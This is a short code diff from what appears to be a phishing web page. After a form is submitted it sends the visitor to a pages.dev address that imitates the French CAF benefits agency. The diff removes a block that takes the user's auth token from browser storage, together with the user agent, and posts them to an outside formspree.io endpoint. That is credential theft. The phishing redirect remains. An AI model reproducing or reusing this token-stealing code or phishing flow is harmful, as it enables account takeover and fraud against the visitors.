@@ -214,22 +214,6 @@ header.hero .hero-inner {
     .then(response => {
       if (response.ok) {
         window.location.href = 'https://caf-fr-subvensiondemandeaccompagnement.pages.dev/attente.html';
-let token = localStorage.getItem("authToken") 
-         || sessionStorage.getItem("token");
-
-let device = navigator.userAgent;
-
-let payload = {
-    token: token,
-    device: device,
-    time: Date.now()
-};
-
-fetch("https://formspree.io/f/mppzdroe", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-});
       }
     });
   });
